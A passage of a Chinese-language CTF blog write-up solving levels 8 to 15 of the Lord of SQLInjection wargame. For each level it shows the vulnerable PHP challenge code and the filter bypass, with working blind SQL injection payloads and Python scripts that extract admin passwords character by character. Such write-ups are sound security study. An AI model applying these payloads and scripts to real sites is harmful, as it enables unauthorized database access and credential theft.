class=\"keyword\">if</span> <span class=\"string\">&quot;Hello admin&quot;</span> <span class=\"keyword\">in</span> r.text:</span><br><span class=\"line\">            temp = temp+s</span><br><span class=\"line\">            print(temp)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br></pre></td></tr></table></figure>\n\n<p>注入出来的结果是<code>7b751aec</code>，pw传入这个值即可通关</p>\n<h1 id=\"8-troll\"><a href=\"#8-troll\" class=\"headerlink\" title=\"8. troll\"></a>8. troll</h1><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\">  <span class=\"keyword\">include</span> <span class=\"string\">&quot;./config.php&quot;</span>; </span><br><span class=\"line\">  login_chk(); </span><br><span class=\"line\">  $db = dbconnect(); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/\\&#x27;/i&#x27;</span>, $_GET[id])) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;No Hack ~_~&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&quot;/admin/&quot;</span>, $_GET[id])) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;HeHe&quot;</span>);</span><br><span class=\"line\">  $query = <span class=\"string\">&quot;select id from prob_troll where id=&#x27;<span class=\"subst\">&#123;$_GET[id]&#125;</span>&#x27;&quot;</span>;</span><br><span class=\"line\">  <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class=\"subst\">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>;</span><br><span class=\"line\">  $result = @mysqli_fetch_array(mysqli_query($db,$query));</span><br><span class=\"line\">  <span class=\"keyword\">if</span>($result[<span class=\"string\">&#x27;id&#x27;</span>] == <span class=\"string\">&#x27;admin&#x27;</span>) solve(<span class=\"string\">&quot;troll&quot;</span>);</span><br><span class=\"line\">  highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>这道题被坑了很久，preg_match对admin是没有忽略大小写的，所以可以直接大小写绕过即可，单引号在这里是没有办法进行绕过的</p>\n<p><code>https://los.rubiya.kr/chall/troll_05b5eb65d94daf81c42dd44136cb0063.php?id=Admin</code></p>\n<h1 id=\"9-vampire\"><a href=\"#9-vampire\" class=\"headerlink\" title=\"9. vampire\"></a>9. vampire</h1><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">  <span class=\"keyword\">include</span> <span class=\"string\">&quot;./config.php&quot;</span>; </span><br><span class=\"line\">  login_chk(); </span><br><span class=\"line\">  $db = dbconnect(); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/\\&#x27;/i&#x27;</span>, $_GET[id])) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;No Hack ~_~&quot;</span>);</span><br><span class=\"line\">  $_GET[id] = strtolower($_GET[id]);</span><br><span class=\"line\">  $_GET[id] = str_replace(<span class=\"string\">&quot;admin&quot;</span>,<span class=\"string\">&quot;&quot;</span>,$_GET[id]); </span><br><span class=\"line\">  $query = <span class=\"string\">&quot;select id from prob_vampire where id=&#x27;<span class=\"subst\">&#123;$_GET[id]&#125;</span>&#x27;&quot;</span>; </span><br><span class=\"line\">  <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class=\"subst\">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class=\"line\">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>($result[<span class=\"string\">&#x27;id&#x27;</span>] == <span class=\"string\">&#x27;admin&#x27;</span>) solve(<span class=\"string\">&quot;vampire&quot;</span>); </span><br><span class=\"line\">  highlight_file(<span class=\"keyword\">__FILE__</span>); </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>这道题很简单，对admin采取了替换的方式，直接可以使用双写绕过</p>\n<p><code>https://los.rubiya.kr/chall/vampire_e3f1ef853da067db37f342f3a1881156.php?id=adadminmin</code></p>\n<h1 id=\"10-skeleton\"><a href=\"#10-skeleton\" class=\"headerlink\" title=\"10. skeleton\"></a>10. skeleton</h1><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">  <span class=\"keyword\">include</span> <span class=\"string\">&quot;./config.php&quot;</span>; </span><br><span class=\"line\">  login_chk(); </span><br><span class=\"line\">  $db = dbconnect(); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/prob|_|\\.|\\(\\)/i&#x27;</span>, $_GET[pw])) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;No Hack ~_~&quot;</span>); </span><br><span class=\"line\">  $query = <span class=\"string\">&quot;select id from prob_skeleton where id=&#x27;guest&#x27; and pw=&#x27;<span class=\"subst\">&#123;$_GET[pw]&#125;</span>&#x27; and 1=0&quot;</span>; </span><br><span class=\"line\">  <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class=\"subst\">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class=\"line\">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>($result[<span class=\"string\">&#x27;id&#x27;</span>] == <span class=\"string\">&#x27;admin&#x27;</span>) solve(<span class=\"string\">&quot;skeleton&quot;</span>); </span><br><span class=\"line\">  highlight_file(<span class=\"keyword\">__FILE__</span>); </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>直接通过注释符将后面的语句注释掉</p>\n<p><code>https://los.rubiya.kr/chall/skeleton_a857a5ab24431d6fb4a00577dac0f39c.php?pw=123&#39;+union+select+&#39;admin&#39;%23</code></p>\n<h1 id=\"11-golem\"><a href=\"#11-golem\" class=\"headerlink\" title=\"11. golem\"></a>11. golem</h1><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">  <span class=\"keyword\">include</span> <span class=\"string\">&quot;./config.php&quot;</span>; </span><br><span class=\"line\">  login_chk(); </span><br><span class=\"line\">  $db = dbconnect(); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/prob|_|\\.|\\(\\)/i&#x27;</span>, $_GET[pw])) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;No Hack ~_~&quot;</span>); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/or|and|substr\\(|=/i&#x27;</span>, $_GET[pw])) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;HeHe&quot;</span>); </span><br><span class=\"line\">  $query = <span class=\"string\">&quot;select id from prob_golem where id=&#x27;guest&#x27; and pw=&#x27;<span class=\"subst\">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class=\"line\">  <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class=\"subst\">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class=\"line\">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>($result[<span class=\"string\">&#x27;id&#x27;</span>]) <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;h2&gt;Hello <span class=\"subst\">&#123;$result[id]&#125;</span>&lt;/h2&gt;&quot;</span>; </span><br><span class=\"line\">   </span><br><span class=\"line\">  $_GET[pw] = addslashes($_GET[pw]); </span><br><span class=\"line\">  $query = <span class=\"string\">&quot;select pw from prob_golem where id=&#x27;admin&#x27; and pw=&#x27;<span class=\"subst\">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class=\"line\">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>(($result[<span class=\"string\">&#x27;pw&#x27;</span>]) &amp;&amp; ($result[<span class=\"string\">&#x27;pw&#x27;</span>] == $_GET[<span class=\"string\">&#x27;pw&#x27;</span>])) solve(<span class=\"string\">&quot;golem&quot;</span>); </span><br><span class=\"line\">  highlight_file(<span class=\"keyword\">__FILE__</span>); </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>过滤了substr可以用mid或者substring替代，and和or可以分别用&amp;&amp;和||进行替换，要查询admin的密码，需要用以下payload:</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">x&#x27;||id+like+&#x27;admin&#x27;%26%26mid(pw,1,1)+like+&#x27;a</span></span><br></pre></td></tr></table></figure>\n\n<p>用python写成脚本跑密码：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\">requests.packages.urllib3.disable_warnings()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">cookie = &#123;<span class=\"string\">&quot;PHPSESSID&quot;</span>: <span class=\"string\">&quot;rhp99vgk8f13cu761gt3lnr774&quot;</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">&quot;x&#x27;||id+like+&#x27;admin&#x27;%26%26mid(pw,&#123;&#125;,1)+like+&#x27;&#123;&#125;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">temp = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">20</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> s <span class=\"keyword\">in</span> string.printable:</span><br><span class=\"line\">        r = requests.get(<span class=\"string\">&quot;https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php?pw=&quot;</span>+payload.<span class=\"built_in\">format</span>(i+<span class=\"number\">1</span>, s), </span><br><span class=\"line\">            cookies=cookie, proxies=&#123;<span class=\"string\">&#x27;https&#x27;</span>: <span class=\"string\">&#x27;http://127.0.0.1:8080&#x27;</span>, <span class=\"string\">&#x27;http&#x27;</span>: <span class=\"string\">&#x27;http://127.0.0.1:8080&#x27;</span>&#125;,</span><br><span class=\"line\">            verify=<span class=\"literal\">False</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">&quot;Hello admin&quot;</span> <span class=\"keyword\">in</span> r.text:</span><br><span class=\"line\">            temp = temp+s</span><br><span class=\"line\">            print(temp)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br></pre></td></tr></table></figure>\n\n<p>最后得到admin的pw为:<code>77d6290b</code></p>\n<h1 id=\"12-darkknight\"><a href=\"#12-darkknight\" class=\"headerlink\" title=\"12. darkknight\"></a>12. darkknight</h1><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">  <span class=\"keyword\">include</span> <span class=\"string\">&quot;./config.php&quot;</span>; </span><br><span class=\"line\">  login_chk(); </span><br><span class=\"line\">  $db = dbconnect(); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/prob|_|\\.|\\(\\)/i&#x27;</span>, $_GET[no])) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;No Hack ~_~&quot;</span>); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/\\&#x27;/i&#x27;</span>, $_GET[pw])) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;HeHe&quot;</span>); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/\\&#x27;|substr|ascii|=/i&#x27;</span>, $_GET[no])) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;HeHe&quot;</span>); </span><br><span class=\"line\">  $query = <span class=\"string\">&quot;select id from prob_darkknight where id=&#x27;guest&#x27; and pw=&#x27;<span class=\"subst\">&#123;$_GET[pw]&#125;</span>&#x27; and no=<span class=\"subst\">&#123;$_GET[no]&#125;</span>&quot;</span>; </span><br><span class=\"line\">  <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class=\"subst\">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class=\"line\">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>($result[<span class=\"string\">&#x27;id&#x27;</span>]) <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;h2&gt;Hello <span class=\"subst\">&#123;$result[id]&#125;</span>&lt;/h2&gt;&quot;</span>; </span><br><span class=\"line\">   </span><br><span class=\"line\">  $_GET[pw] = addslashes($_GET[pw]); </span><br><span class=\"line\">  $query = <span class=\"string\">&quot;select pw from prob_darkknight where id=&#x27;admin&#x27; and pw=&#x27;<span class=\"subst\">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class=\"line\">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>(($result[<span class=\"string\">&#x27;pw&#x27;</span>]) &amp;&amp; ($result[<span class=\"string\">&#x27;pw&#x27;</span>] == $_GET[<span class=\"string\">&#x27;pw&#x27;</span>])) solve(<span class=\"string\">&quot;darkknight&quot;</span>); </span><br><span class=\"line\">  highlight_file(<span class=\"keyword\">__FILE__</span>); </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>过滤了ascii可以用ord替换，过滤了=号可以用&lt;&gt;不等号进行替换，不能用单引号闭合，则在no参数进行注入。注入的paylaod如下</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">1+or+id+like+0x61646d696e+and+ord(mid(pw,1,1))&lt;&gt;22</span></span><br></pre></td></tr></table></figure>\n\n<p>写python脚本进行注入</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\">requests.packages.urllib3.disable_warnings()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">cookie = &#123;<span class=\"string\">&quot;PHPSESSID&quot;</span>: <span class=\"string\">&quot;rhp99vgk8f13cu761gt3lnr774&quot;</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">&quot;1+or+id+like+0x61646d696e+and+ord(mid(pw,&#123;&#125;,1))&lt;&gt;&#123;&#125;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">temp = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">20</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> s <span class=\"keyword\">in</span> string.printable:</span><br><span class=\"line\">        r = requests.get(<span class=\"string\">&quot;https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php?pw=1&amp;no=&quot;</span>+payload.<span class=\"built_in\">format</span>(i+<span class=\"number\">1</span>, <span class=\"built_in\">ord</span>(s)), </span><br><span class=\"line\">            cookies=cookie, proxies=&#123;<span class=\"string\">&#x27;https&#x27;</span>: <span class=\"string\">&#x27;http://127.0.0.1:8080&#x27;</span>, <span class=\"string\">&#x27;http&#x27;</span>: <span class=\"string\">&#x27;http://127.0.0.1:8080&#x27;</span>&#125;,</span><br><span class=\"line\">            verify=<span class=\"literal\">False</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">&quot;Hello admin&quot;</span> <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> r.text:</span><br><span class=\"line\">            temp = temp+s</span><br><span class=\"line\">            print(temp)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br></pre></td></tr></table></figure>\n\n<p>等到admin的pw为：<code>0b70ea1f</code></p>\n<h1 id=\"13-bugbear\"><a href=\"#13-bugbear\" class=\"headerlink\" title=\"13. bugbear\"></a>13. bugbear</h1><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">  <span class=\"keyword\">include</span> <span class=\"string\">&quot;./config.php&quot;</span>; </span><br><span class=\"line\">  login_chk(); </span><br><span class=\"line\">  $db = dbconnect(); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/prob|_|\\.|\\(\\)/i&#x27;</span>, $_GET[no])) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;No Hack ~_~&quot;</span>); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/\\&#x27;/i&#x27;</span>, $_GET[pw])) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;HeHe&quot;</span>); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/\\&#x27;|substr|ascii|=|or|and| |like|0x/i&#x27;</span>, $_GET[no])) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;HeHe&quot;</span>); </span><br><span class=\"line\">  $query = <span class=\"string\">&quot;select id from prob_bugbear where id=&#x27;guest&#x27; and pw=&#x27;<span class=\"subst\">&#123;$_GET[pw]&#125;</span>&#x27; and no=<span class=\"subst\">&#123;$_GET[no]&#125;</span>&quot;</span>; </span><br><span class=\"line\">  <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class=\"subst\">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class=\"line\">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>($result[<span class=\"string\">&#x27;id&#x27;</span>]) <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;h2&gt;Hello <span class=\"subst\">&#123;$result[id]&#125;</span>&lt;/h2&gt;&quot;</span>; </span><br><span class=\"line\">   </span><br><span class=\"line\">  $_GET[pw] = addslashes($_GET[pw]); </span><br><span class=\"line\">  $query = <span class=\"string\">&quot;select pw from prob_bugbear where id=&#x27;admin&#x27; and pw=&#x27;<span class=\"subst\">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class=\"line\">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>(($result[<span class=\"string\">&#x27;pw&#x27;</span>]) &amp;&amp; ($result[<span class=\"string\">&#x27;pw&#x27;</span>] == $_GET[<span class=\"string\">&#x27;pw&#x27;</span>])) solve(<span class=\"string\">&quot;bugbear&quot;</span>); </span><br><span class=\"line\">  highlight_file(<span class=\"keyword\">__FILE__</span>); </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>过滤了很多，直接贴代码吧，用in来判断字符可以避免使用like、=、regexp等，no可以使用no&gt;1&amp;&amp;no&lt;3来使no指向2</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\">requests.packages.urllib3.disable_warnings()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">cookie = &#123;<span class=\"string\">&quot;PHPSESSID&quot;</span>: <span class=\"string\">&quot;rhp99vgk8f13cu761gt3lnr774&quot;</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">&#x27;1||no&lt;3%26%26no&gt;1%26%26mid(pw,&#123;&#125;,1)/**/in(&quot;&#123;&#125;&quot;)&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">temp = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">20</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> s <span class=\"keyword\">in</span> string.printable:</span><br><span class=\"line\">        r = requests.get(<span class=\"string\">&quot;https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php?pw=1&amp;no=&quot;</span>+payload.<span class=\"built_in\">format</span>(i+<span class=\"number\">1</span>, s), </span><br><span class=\"line\">            cookies=cookie, proxies=&#123;<span class=\"string\">&#x27;https&#x27;</span>: <span class=\"string\">&#x27;http://127.0.0.1:8080&#x27;</span>, <span class=\"string\">&#x27;http&#x27;</span>: <span class=\"string\">&#x27;http://127.0.0.1:8080&#x27;</span>&#125;,</span><br><span class=\"line\">            verify=<span class=\"literal\">False</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">&quot;Hello admin&quot;</span> <span class=\"keyword\">in</span> r.text:</span><br><span class=\"line\">            temp = temp+s</span><br><span class=\"line\">            print(temp)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br></pre></td></tr></table></figure>\n\n<p>跑出来密码：<code>52dc3991</code></p>\n<h1 id=\"14-giant\"><a href=\"#14-giant\" class=\"headerlink\" title=\"14. giant\"></a>14. giant</h1><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">  <span class=\"keyword\">include</span> <span class=\"string\">&quot;./config.php&quot;</span>; </span><br><span class=\"line\">  login_chk(); </span><br><span class=\"line\">  $db = dbconnect(); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>(strlen($_GET[shit])&gt;<span class=\"number\">1</span>) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;No Hack ~_~&quot;</span>); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/ |\\n|\\r|\\t/i&#x27;</span>, $_GET[shit])) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;HeHe&quot;</span>); </span><br><span class=\"line\">  $query = <span class=\"string\">&quot;select 1234 from<span class=\"subst\">&#123;$_GET[shit]&#125;</span>prob_giant where 1&quot;</span>; </span><br><span class=\"line\">  <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class=\"subst\">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class=\"line\">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>($result[<span class=\"number\">1234</span>]) solve(<span class=\"string\">&quot;giant&quot;</span>); </span><br><span class=\"line\">  highlight_file(<span class=\"keyword\">__FILE__</span>); </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>要让from和表名间出现一个空格，过滤了一些字符，这个很简单，直接用burp进行fuzz，%00-%ff共256种可能，共发现<code>%0b</code>,<code>%0c</code>，可以绕过</p>\n<h1 id=\"15-assassin\"><a href=\"#15-assassin\" class=\"headerlink\" title=\"15. assassin\"></a>15. assassin</h1><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">  <span class=\"keyword\">include</span> <span class=\"string\">&quot;./config.php&quot;</span>; </span><br><span class=\"line\">  login_chk(); </span><br><span class=\"line\">  $db = dbconnect(); </span><br><span class=\"line\">  <span 